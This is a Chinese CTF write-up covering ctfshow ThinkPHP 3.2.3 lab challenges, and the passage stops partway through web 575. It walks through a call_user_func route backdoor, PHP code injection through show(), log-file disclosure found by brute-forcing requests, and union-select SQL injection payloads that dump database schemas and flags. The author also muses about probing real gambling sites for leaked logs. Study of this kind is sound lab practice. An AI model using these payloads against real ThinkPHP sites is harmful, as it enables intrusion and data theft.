tXuQTu/Y5ETbR0v7tNSFnvrmu6pjdoan2KjMu8q/Hmj1EfCO2ZGfEIbIXKUlw8qaX9/b2oeSJmFksSeT/Fn0V3nSypChh4Gjh74ybO9aeZ/AN2dwciu2/MhAAAAAElFTkSuQmCC">ctfshow-thinkphp专题<!----></h1>  <div class="theme-vdoing-content content__default"><div class="custom-block tip"><p class="custom-block-title">笔者说</p> <p>在此之前，对于tp框架题目我总是选择逃避，听说鲷鱼瑟琴菠菜网站一般会使用这些框架(<s>喜</s>)，咳，学习一下框架(<s>姿势</s>)。在<code>ctfshow</code>靶场和tp官方文档的引导下，可以丝滑入门。</p></div> <p><img src="/medias/show-think/tp.png" alt="tp"></p> <blockquote><p>描述：此专题专门用来深入学习thinkphp</p></blockquote> <h2 id="web-569"><a href="#web-569" class="header-anchor">#</a> web 569</h2> <blockquote><p>描述：本题使用的版本为3.2.3</p></blockquote> <p>打开题目提示<code>thinkphp 专项训练-pathinfo的运用，flag在Admin模块的Login控制器的ctfshowLogin方法中</code></p> <p><img src="/medias/show-think/1.png" alt="1"></p> <p>谷歌一下<a href="https://www.kancloud.cn/manual/thinkphp/1697" target="_blank" rel="noopener noreferrer">thinkphp3 pathinfo<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>在这里，没有截全</p> <p><img src="/medias/show-think/2.png" alt="2"></p> <p>可以了解到<code>pathinfo</code>几种模式，url默认区分大小写，可以修改默认配置</p> <ul><li>thinkphp 3.2标准模式（pathinfo模式）</li></ul> <p><code>http://serverName/index.php/模块/控制器/操作</code></p> <ul><li>URL模式</li></ul> <p>如果我们直接访问入口文件的话，由于URL中没有模块、控制器和操作，因此系统会访问默认模块（Home）下面的默认控制器（Index）的默认操作（index），因此下面的访问是等效的：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>http<span class="token punctuation">:</span><span class="token comment">//serverName/index.php</span>
http<span class="token punctuation">:</span><span class="token comment">//serverName/index.php/Home/Index/index</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ul><li>普通模式</li></ul> <p><strong>普通模式</strong>也就是传统的GET传参方式来指定当前访问的模块和操作，例如： <code>http://localhost/?m=home&amp;c=user&amp;a=login&amp;var=value</code></p> <p>m参数表示模块，c参数表示控制器，a参数表示操作（方法），后面的表示其他GET参数</p> <ul><li>PATHINFO模式</li></ul> <p><strong>PATHINFO模式</strong>是系统的默认URL模式，提供了最好的SEO支持，系统内部已经做了环境的兼容处理，所以能够支持大多数的主机环境。对应上面的URL模式，PATHINFO模式下面的URL访问地址是： <code>http://localhost/index.php/home/user/login/var/value/</code></p> <ul><li>REWRITE模式</li></ul> <p>REWRITE模式是在PATHINFO模式的基础上添加了重写规则的支持，可以去掉URL地址里面的入口文件index.php，但是需要额外配置WEB服务器的重写规则。</p> <ul><li>兼容模式</li></ul> <p><strong>兼容模式</strong>是用于不支持PATHINFO的特殊环境，URL地址是： <code>http://localhost/?s=/home/user/login/var/value</code></p> <p>可以更改兼容模式变量的名称定义，例如：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token string single-quoted-string">'VAR_PATHINFO'</span>          <span class="token operator">=&gt;</span>  <span class="token string single-quoted-string">'path'</span>
<span class="token comment">// 更改PATHINFO参数分隔符</span>
<span class="token string single-quoted-string">'URL_PATHINFO_DEPR'</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">'-'</span><span class="token punctuation">,</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>配置后可以使用<code>http://localhost/?path=/home-user-login-var-value</code>访问</p> <p>啰嗦了。回归主题：<code>flag在Admin模块的Login控制器的ctfshowLogin方法中</code></p> <p>访问：</p> <p>标准模式：<code>url/index.php/Admin/Login/ctfshowLogin</code></p> <p>普通模式：<code>url/index.php?s=/Admin&amp;c=Login&amp;a=ctfshowLogin</code></p> <p>pathinfo模式(标准模式)：<code>url/index.php/Admin/Login/ctfshowLogin</code></p> <p>兼容模式：<code>url/index.php?s=/Admin/Login/ctfshowLogin</code></p> <h2 id="web-570"><a href="#web-570" class="header-anchor">#</a> web 570</h2> <blockquote><p>描述：黑客建立了闭包路由后门，你能找到吗</p></blockquote> <p>谷歌一下<a href="https://www.kancloud.cn/manual/thinkphp/1710" target="_blank" rel="noopener noreferrer">thinkphp3 闭包路由<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>学习到了闭包路由传递参数</p> <p>规则路由：</p> <p>规则路由中定义的动态变量的名称 就是闭包函数中的参数名称，不分次序。 因此，如果我们访问的URL地址是： <code>http://serverName/Home/hello/thinkphp</code></p> <p>这个规则路由发现符合<code>url/hello/var/value</code>时，参数传递比较简单，直接拿进去了</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token string single-quoted-string">'hello/:name'</span> <span class="token operator">=&gt;</span> 
    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hello,'</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>正则路由：</p> <p>如果是正则路由的话，闭包函数中的参数就以正则中出现的参数次序来传递，例如：</p> <p>通过正则来匹配参数</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token string single-quoted-string">'/^new\/(\d{4})\/(\d{2})$/'</span> <span class="token operator">=&gt;</span> 
    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$year</span><span class="token punctuation">,</span><span class="token variable">$month</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'year='</span><span class="token operator">.</span><span class="token variable">$year</span><span class="token operator">.</span><span class="token string single-quoted-string">'&amp;month='</span><span class="token operator">.</span><span class="token variable">$month</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>嘻嘻。懒得一个一个找了，直接扔d盾了，在<code>Common/Conf/config.php</code>文件里</p> <p><img src="/medias/show-think/4.png" alt="4"></p> <p>发现在<code>ctfshow</code>模块存在<code>call_user_func</code>回调函数做后门，利用一下</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token string single-quoted-string">'ctfshow/:f/:a'</span> <span class="token operator">=&gt;</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    	<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    	<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><img src="/medias/show-think/5.png" alt="5"></p> <p>测试一下，<code>url/index.php/ctfshow/assert/phpinfo();</code></p> <p>完美</p> <p><img src="/medias/show-think/6.png" alt="6"></p> <p>对了。不要在参数里写<code>/</code>，这会和thinkphp这种把参数值写在url里的模式发生冲突</p> <p><img src="/medias/show-think/7.png" alt="7"></p> <p>可以传递参数，用个POST参数绕过一下</p> <p><img src="/medias/show-think/8.png" alt="8"></p> <h2 id="web-571"><a href="#web-571" class="header-anchor">#</a> web 571</h2> <blockquote><p>描述：hello,黑客建立了控制器后门，你能找到吗</p></blockquote> <p>谷歌一下 <a href="https://www.kancloud.cn/manual/thinkphp/1713" target="_blank" rel="noopener noreferrer">thinkphp3 控制器<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>可以学习到：</p> <ul><li>ThinkPHP的控制器是一个类</li> <li>这个类(控制器)下面定义的函数叫做操作(方法)</li></ul> <p><img src="/medias/show-think/9.png" alt="9"></p> <p>例子：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'hello,thinkphp!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p><code>Home\IndexController</code>类就代表了Home模块下的Index控制器，而hello操作就是<code>Home\IndexController</code>类的hello（公共）方法。</p> <p>当访问 <code>http://serverName/index.php/Home/Index/hello</code> 后会输出：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>hello,thinkphp!
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><blockquote><p>这里我发现：定义的类名为<code>IndexController</code>，访问的时候却可以省略<code>Controller</code>，直接访问<code>Index</code>，奇怪了？</p></blockquote> <p>在 ThinkPHP 中，类名后缀 Controller 可以在访问 URL 时省略，是因为框架在内部处理请求时，会自动加上这个后缀来寻找对应的控制器类。框架遵循一定的命名约定，自动匹配用户输入的控制器名称和带有 Controller 后缀的类名。</p> <p>回归主题：找到控制器后门</p> <p>丢进d盾，竟然没找到</p> <p>在<code>Admin/Controller/</code>路由下存在两个php文件，内容基本一下，没有看到接受参数，应该不是后门</p> <p><img src="/medias/show-think/10.png" alt="10"></p> <p>最终可以在<code>Home/Controller/IndexController.class.php</code>文件里找到后门<code>show方法</code>，会解析php代码</p> <p>在这里，可以知道后门函数处于Home模块的IndexController控制器，不理解的是为什么这个函数可以接受GET、POST参数</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p><img src="/medias/show-think/11.png" alt="11"></p> <p>这两种都可以</p> <p>GET：<code>url/index.php/Home/Index/index/?n=&lt;?php phpinfo();?&gt;</code></p> <p>POST：<code>url/index.php/Home/Index/index/</code> +  <code>n=&lt;?php phpinfo();?&gt;</code></p> <p>为什么这种不行？？也就是上面提到的pathinfo模式</p> <p>GET：<code>url/index.php/Home/Index/index/n/&lt;?php phpinfo();?&gt;</code></p> <h2 id="web-572"><a href="#web-572" class="header-anchor">#</a> web 572</h2> <blockquote><p>描述：hello,没有源码，如何获取黑客的蛛丝马迹？</p></blockquote> <p>信息泄露挖掘，thinkphp3在调试模式下会记录详细的日志信息</p> <blockquote><p>thinkphp在开启DEBUG的情况下会在Runtime目录下生成日志，虽然Thinkphp官方一再强调生产模式下需要关闭debug，但很多管理员还是忘记关闭。</p></blockquote> <p>似乎是这样的，那是不是说看到鲷鱼瑟琴菠菜类网站是tp框架可以看看是否忘记关闭了调试模式呢（若有所思）</p> <p>谷歌一下<a href="https://www.kancloud.cn/manual/thinkphp/1827" target="_blank" rel="noopener noreferrer">日志记录<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><a href="https://www.cnblogs.com/Cl0ud/p/15941252.html" target="_blank" rel="noopener noreferrer">thinkphp日志泄露<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><strong>默认情况下只是在调试模式记录日志，要在部署模式开启日志记录</strong>，必须在配置中开启<code>LOG_RECORD</code>参数，以及可以在应用配置文件中配置需要记录的日志级别，例如：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token string single-quoted-string">'LOG_RECORD'</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token comment">// 开启日志记录</span>
<span class="token string single-quoted-string">'LOG_LEVEL'</span>  <span class="token operator">=&gt;</span><span class="token string single-quoted-string">'EMERG,ALERT,CRIT,ERR'</span><span class="token punctuation">,</span> <span class="token comment">// 只记录EMERG ALERT CRIT ERR 错误</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><strong>ThinkPHP3日志目录</strong>：</p> <ul><li><p>/Runtime/Logs/</p></li> <li><p>/App/Runtime/Logs/</p></li> <li><p>/Application/Runtime/Logs/Admin/</p></li> <li><p>/Application/Runtime/Logs/Home/</p></li> <li><p>/Application/Runtime/Logs/</p></li> <li><p>日志格式为：<code>/App/Runtime/Logs/21_05_17.log</code></p></li></ul> <p>TP5有所不同，这里不提</p> <p>回归主题：找到泄露的敏感信息（日志目录，日志文件）</p> <p>尝试上面列举的日志目录，看是哪一类</p> <p>如果是不符合的目录，tp框架似乎没有反应</p> <p><img src="/medias/show-think/12.png" alt="12"></p> <p>在试到<code>/Application/Runtime/Logs/Admin/</code>和<code>/Application/Runtime/Logs/Home/</code>类型时，页面提示<code>403</code>，说明存在，尝试访问日志<code>24_01_01.log</code>时，页面又变成之前没有反应的样子了，说明这个日志不存在，bp爆破出存在的日志，多爆几年也没什么(展示容错)，从24年开始试</p> <p><img src="/medias/show-think/13.png" alt="13"></p> <p><img src="/medias/show-think/14.png" alt="14"></p> <div class="language-plaintext line-numbers-mode"><pre class="language-plaintext"><code>GET /Application/Runtime/Logs/Admin/§24_01_01§.log HTTP/1.1
Host: 19862dcf-d6d6-466c-a486-2836bd3ee425.challenge.ctf.show
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p><img src="/medias/show-think/15.png" alt="15"></p> <p>爆破返回数据长度都一样，24年没有日志，往前试。闹麻了，爆了5年都没有，尝试下<code>/Application/Runtime/Logs/Home/</code>目录下的日志</p> <div class="language-plaintext line-numbers-mode"><pre class="language-plaintext"><code>GET /Application/Runtime/Logs/Home/§24_01_01§.log HTTP/1.1
Host: 19862dcf-d6d6-466c-a486-2836bd3ee425.challenge.ctf.show
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>找到线索，大概是类似前面的show方法渲染？</p> <div class="language-plaintext line-numbers-mode"><pre class="language-plaintext"><code>[ 2021-04-15T14:49:32+08:00 ] 127.0.0.1 /index.php?showctf=%3C?php%20phpinfo();?%3E
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/show-think/16.png" alt="16"></p> <p><img src="/medias/show-think/17.png" alt="17"></p> <h2 id="web-573"><a href="#web-573" class="header-anchor">#</a> web 573</h2> <blockquote><p>描述： sql注入，flag在数据库中</p></blockquote> <p>测试正常sql注入时，似乎不会查询，猜测tp框架内部重写了查询语句</p> <p>谷歌一下<a href="https://www.kancloud.cn/manual/thinkphp/1767" target="_blank" rel="noopener noreferrer">查询方式<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <blockquote><p>ThinkPHP可以支持直接使用字符串作为查询条件，但是大多数情况推荐使用数组或者对象来作为查询条件，因为会更加安全。</p></blockquote> <p>首先，支持正常的字符串查询，其次，<strong>tp框架支持且推荐以数组或者对象作为查询条件</strong>，举例</p> <ul><li>使用数组作为查询条件</li></ul> <p>这种方式是最常用的查询方式，例如：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$User</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;User&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 实例化User对象</span>
<span class="token variable">$condition</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'thinkphp'</span><span class="token punctuation">;</span>
<span class="token variable">$condition</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'status'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token comment">// 把查询条件传入查询方法</span>
<span class="token variable">$User</span><span class="token operator">-&gt;</span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$condition</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>最后生成的SQL语句是</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> think_user <span class="token keyword">WHERE</span> <span class="token identifier"><span class="token punctuation">`</span>name<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token string">'thinkphp'</span> <span class="token operator">AND</span> <span class="token keyword">status</span><span class="token operator">=</span><span class="token number">1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>好了，关键就在这里，发现了吗，tp框架会把数组变量的键值对作为sql语句里的查询条件</p> <p>看了其他师傅的wp，发现可以给变量添加一个<code>where</code>键名，实现复写原sql语句的<code>where</code>条件！震惊</p> <p>回归主题：SQL注入</p> <p>传一个数组变量id，键名<code>where</code>，键值为查询条件，给一个错误的sql条件，报下错，验证是否能复写where</p> <p><img src="/medias/show-think/20.png" alt="20"></p> <p>这里可以看到，条件只要合理，是完全可控的。通过测试，发现存在4个字段，第二个字段是会回显位</p> <p><img src="/medias/show-think/21.png" alt="21"></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 爆库  ctfshow,ctftraining,information_schema,mysql,performance_schema,test</span>
?id<span class="token punctuation">[</span><span class="token keyword">where</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span class="token operator">%</span><span class="token number">23</span>
<span class="token comment"># 爆表  ctfshow_users,flags,FLAG_TABLE,news,users ....</span>
?id<span class="token punctuation">[</span><span class="token keyword">where</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token operator">%</span><span class="token number">23</span>
<span class="token comment"># 爆字段</span>
?id<span class="token punctuation">[</span><span class="token keyword">where</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token operator">%</span><span class="token number">23</span>
<span class="token comment">#爆flag</span>
?id<span class="token punctuation">[</span><span class="token keyword">where</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>flag4s<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> ctfshow<span class="token punctuation">.</span>flags<span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>其他师傅做到详细跟踪<a href="https://blog.csdn.net/qq_50589021/article/details/120616736" target="_blank" rel="noopener noreferrer">tp3 SQL注入漏洞跟踪<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h2 id="web-574"><a href="#web-574" class="header-anchor">#</a> web 574</h2> <blockquote><p>描述：sql注入，flag在数据库中</p></blockquote> <p>给出提示：这里把接收到的参数和字符串<code>'id='</code>进行了拼接，那么间接的禁止了传入数组类型</p> <p>不过，这里是不是说直接把拼接的内容作为查询条件了？？？</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Users'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'id='</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token variable">$html</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>太棒了，我喜欢！</p> <p><img src="/medias/show-think/22.png" alt="22"></p> <p>这里的括号可以闭合，下面操作就和上题一样了。狠狠的注入正能量！</p> <p><img src="/medias/show-think/23.png" alt="23"></p> <h2 id="web-575"><a href="#web-575" class="header-anchor">#</a> web 575</h2> <blockquote><p>描述：需要拿shell，稍微有点难</p></blockquote> <p>题目给出了使用的部分源码</p> <p>群主的预期解是写入shell，但是使用了<code>show()</code>方法，存在渲染漏洞的非预期</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$user</span><span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
